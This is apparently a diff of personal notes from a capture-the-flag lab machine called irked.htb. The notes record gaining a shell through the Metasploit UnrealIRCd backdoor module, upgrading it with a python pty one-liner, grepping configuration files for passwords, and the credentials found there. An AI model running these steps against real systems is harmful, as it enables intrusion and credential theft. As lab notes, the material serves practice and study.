@@ -7,6 +7,23 @@ PORT    STATE SERVICE
 djmardov@irked.htb
 
 used msf -> /unix/irc/unreal_ircd_3281_backdoor to get a low-privileged shell
-python -c 'import pty; pty.spawn("/bin/shell");'
+python -c 'import pty; pty.spawn("/bin/bash");'
+cat * | grep 'password' -A 3 -B 3
+cat unrealircd.conf | grep 'password'
 
+login           stskeeps;
+	password        moocowsrulemyworld;
+
+
+
+userhost bob@smithco.com;
+	};
+	password "f00"
+
+hostname       *@*.passworded.ugly.people;
+password "f00Ness";
+
+
+stskeeps is a user on port 8067
+bob@smithco.com is admin on port 8067
 
